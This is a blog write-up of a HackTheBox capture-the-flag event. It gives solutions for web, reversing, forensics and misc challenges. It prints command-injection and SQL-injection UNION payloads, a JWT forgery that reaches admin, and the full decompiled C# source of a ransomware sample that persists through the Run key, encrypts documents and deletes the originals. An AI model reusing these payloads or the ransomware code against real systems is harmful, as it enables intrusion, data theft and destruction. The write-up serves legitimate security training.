---
title: HackTheBox CTF@USF
date: 2022-11-23 09:45:47 +07:00
modified: 2022-11-23 09:45:47 +07:00
tags: [Web , HTB, USF, CTF ,Writeup]
description: Write Up for HackTheBox CTF@USF
---

![](https://photos.squarezero.dev/file/abir-images/HTBUSF2022/logo.png)
We participated in our local HTB-hosted USF CTF and we ended up being 1st! It was a day-long CTF but we solved all of the challenges within 4hours. Some of the challenges were very interesting. These are all the write-ups for the challenges.

![](https://photos.squarezero.dev/file/abir-images/HTBUSF2022/1.png)

# [WEB]()

## Challenge → DeLorean Clock

**Description** → Dr. Brown wants to jump on the web 3.0 bandwagon and make his DeLorean controllable via blockchain! He made a web interface of the DeLorean time clock but launching the DeLorean to a miscalculated date can create a time paradox, the result of which could cause a chain reaction that would unravel the very fabric of the space-time continuum and destroy the entire universe! Can you test if the web interface is accurate and secure?

**Solution** → We are presented with a website running some kind of clock. There is a option where you can set time in.

![](https://photos.squarezero.dev/file/abir-images/HTBUSF2022/2.png)

If we put any date it gives us an error.

![](https://photos.squarezero.dev/file/abir-images/HTBUSF2022/3.png)

I looks like we were directly acting with command line. So I decided to use command Injection to get the flag.

**Payload** → ``cat flag.txt`` or `$(cat flag.txt)`

![](https://photos.squarezero.dev/file/abir-images/HTBUSF2022/4.png)

**[Flag]()** → `HTB{d0nt_p4ss_Us3r_Inpu7s_t0_c0mm4ndl1n3}`

## Challenge → DeLorean Clock

**Description** → You have been tasked with the pentesting engagement on the memorial website of the great Buford "Mad Dog" Tannen, who was a true patriotic countryman and the pride of Hill Valley! The Tannen family has asked you to find out any loopholes in the system and see if the admin account can be compromised. They don't want any teenager or a mad scientist to break in and discover the secrets they are hiding!

**Solution** → I checked the source code and I figured out that there is a SQL database.

![](https://photos.squarezero.dev/file/abir-images/HTBUSF2022/5.png)

It looks like the posts are coming from the SQL database.

![](https://photos.squarezero.dev/file/abir-images/HTBUSF2022/6.png)

**Payload** → `' UNION select 1,2,3,4-- -`

`http://<ip:port>/posts/'%20UNION%20select%201,2,3,4--%20-`


Success! Our injection is working!

![](https://photos.squarezero.dev/file/abir-images/HTBUSF2022/7.png)

After looking at the source codes for sometime I figure out the table and the filename.

![](https://photos.squarezero.dev/file/abir-images/HTBUSF2022/8.png)

![](https://photos.squarezero.dev/file/abir-images/HTBUSF2022/9.png)

**Payload** → `' UNION select 1, secret,3,4 from keystore-- -`

`http://<ip:port>/posts/'%20UNION%20select%201,secret,3,4%20from%20keystore--%20-`

![](https://photos.squarezero.dev/file/abir-images/HTBUSF2022/10.png)

The main goal of this challenge is to change the user to admin. If we look at the cookie, It is a `JWT` token. 

![](https://photos.squarezero.dev/file/abir-images/HTBUSF2022/11.png)

So I changed the username to `admin`, kid to `1`, and add the secret code → `yEgEoSOKXmT50LM`


![](https://photos.squarezero.dev/file/abir-images/HTBUSF2022/12.png)

After replacing the cookie I got the flag.

![](https://photos.squarezero.dev/file/abir-images/HTBUSF2022/13.png)

**[Flag]()** → `HTB{t4nn3n_fr4m3d_th3_mcFly}`

# [REV]()

## Challenge → Almanac

**Description** → You've managed to steal Biff's secret sports almanac! Could he have hidden a flag somewhere inside?

**Solution** → Simply `String` the file to get the flag!

**payload** → `strings almanac | grep htb -i`

**[Flag]()** → `HTB{7h15_b00k_t3ll5_th3_futur3!}`

# [Forensics]()

## Challenge → Unfinished Business

**Description** → "Mad Dog" Tannen wanted to get revenge on Marty after their duel outside of Palace Saloon. While in prison, he developed a ransomware to infect Marty's computer. Now, every time Marty reboots his computer, his files get encrypted. Without being able to access them, Marty cannot follow the plan Mr.Brown sent to him, in order to escape the Old West before it is too late.

**Solution** → We are presented with 2 files. `memory.raw` and `big_plan.pdf.enc` . I used volatility to find out the profile and its 

`vol.py -f memory.raw imageinfo`

![](https://photos.squarezero.dev/file/abir-images/HTBUSF2022/14.png)

I looked for malicious files and found this. I found a malicious `Rans.exe` and `dll` in the download folder.

`vol.py -f memory.raw --profile=Win7SP1x86_23418 filescan | grep Rans -i`

![](https://photos.squarezero.dev/file/abir-images/HTBUSF2022/15.png)

![](https://photos.squarezero.dev/file/abir-images/HTBUSF2022/16.png)

I dump it both files.

`vol.py -f memory.raw --profile=Win7SP1x86_23418 dumpfiles -Q 0x000000003f578038 0x000000003e693be8 -D .`

I checked the DLL in `dnspy` and found the following code.

[Original Code]() → 

```vbnet
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;

namespace Rans
{
	// Token: 0x02000002 RID: 2
	internal class Program
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		private static void Main(string[] args)
		{
			string sDir = string.Format("C:\\Users\\{0}\\Documents", Environment.UserName);
			Program.CheckRunKey();
			Program.ParseDir(sDir, "32xDrd6kBp4gJjOw");
		}

		// Token: 0x06000002 RID: 2 RVA: 0x00002070 File Offset: 0x00000270
		public static void CheckRunKey()
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
			if (!registryKey.GetValueNames().Contains("Rans"))
			{
				FileInfo fileInfo = new FileInfo("Rans.exe");
				registryKey.SetValue("Rans", fileInfo.FullName);
			}
		}

		// Token: 0x06000003 RID: 3 RVA: 0x000020BC File Offset: 0x000002BC
		public static void ParseDir(string sDir, string key)
		{
			List<string> list = new List<string>
			{
				"jpg",
				"mp3",
				"mp4",
				"png",
				"pdf",
				"txt",
				"doc",
				"docx",
				"docm",
				"ppt",
				"pptx",
				"xls",
				"xlsx"
			};
			foreach (string text in Directory.GetFiles(sDir))
			{
				string[] array = text.Split('.', StringSplitOptions.None);
				string item = array[1];
				string text2 = array[array.Length - 1];
				if (list.Contains(item) && !text2.Equals("enc"))
				{
					Console.WriteLine("Encrypting: " + text);
					Program.EncryptFile(text, key);
				}
			}
		}

		// Token: 0x06000004 RID: 4 RVA: 0x000021BC File Offset: 0x000003BC
		public static void EncryptFile(string file, string key)
		{
			byte[] array = File.ReadAllBytes(file);
			byte[] iv = new byte[]
			{
				99,
				104,
				105,
				99,
				107,
				101,
				110,
				32,
				77,
				97,
				114,
				116,
				121,
				33,
				33,
				33
			};
			SymmetricAlgorithm symmetricAlgorithm = Aes.Create();
			HashAlgorithm hashAlgorithm = MD5.Create();
			symmetricAlgorithm.BlockSize = 128;
			symmetricAlgorithm.Key = hashAlgorithm.ComputeHash(Encoding.Unicode.GetBytes(key));
			symmetricAlgorithm.IV = iv;
			using (CryptoStream cryptoStream = new CryptoStream(new FileStream(file + ".enc", FileMode.Create, FileAccess.Write), symmetricAlgorithm.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(array, 0, array.Length);
			}
			File.Delete(file);
		}
	}
}
```

I’m not good with coding much, But my teammate `JAY` fixed the code and we decoded the file with the code.

[Decryption Code]() →

```vbnet
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;

namespace decryptor
{

    class Program
    {
        private static void Main(string[] args)
        {
            string sDir = string.Format("c:/tmp", Environment.UserName);
            Program.ParseDir(sDir, "32xDrd6kBp4gJjOw");
        }

        public static void ParseDir(string sDir, string key)
        {
            List<string> list = new List<string>
            {
                "enc","pdf"
            };
            foreach (string text in Directory.GetFiles(sDir))
            {
                string[] array = text.Split('.', StringSplitOptions.None);
                string item = array[1];
                string text2 = array[array.Length - 1];
                if (list.Contains(item) && text2.Equals("enc"))
                {
                    Program.DecryptFile(text, key);
                }
            }
        }
        public static void DecryptFile(string file, string key)
        {
            byte[] array = File.ReadAllBytes(file);
            byte[] iv = new byte[]
            {
                99,
                104,
                105,
                99,
                107,
                101,
                110,
                32,
                77,
                97,
                114,
                116,
                121,
                33,
                33,
                33
            };
            SymmetricAlgorithm symmetricAlgorithm = Aes.Create();
            HashAlgorithm hashAlgorithm = MD5.Create();
            symmetricAlgorithm.BlockSize = 128;
            symmetricAlgorithm.Key = hashAlgorithm.ComputeHash(Encoding.Unicode.GetBytes(key));
            symmetricAlgorithm.IV = iv;

            using (CryptoStream cryptoStream = new CryptoStream(new FileStream(file + ".dec", FileMode.Create), symmetricAlgorithm.CreateDecryptor(), CryptoStreamMode.Write))
            {
                cryptoStream.Write(array, 0, array.Length);
            }
            File.Delete(file);
        }
    }
}
```

After Decrypting the file I got the flag.

**[Flag]()** → `HTB{4n0the3r_0n3_T4nn3n_d3f34t3d}`

# [MISC]()

## Challenge → Heatflow 

**Description** → The flux capacitor v2.0 requires even more jigowatts to run stably! To properly dissipate the excessive amount of heat produced by the new prototype we have gathered the required data to design an adequate cooling system by measuring the temperature across five key parts of the circuit board every minute. Can you help us analyze the data?

**Solution** → This was one of the most frustrating challenges we did. After trying everything and looking for similar CTF we finally found the solution!

After opening the file in Excel 

`Conditional Formatting` → `Top/Bottom Rules` → `Above AVG` → `Select Color`

![](https://photos.squarezero.dev/file/abir-images/HTBUSF2022/17.png)

**[Flag]()** → `HTB{M0R3_P0W3R_M0R3_HE4T}`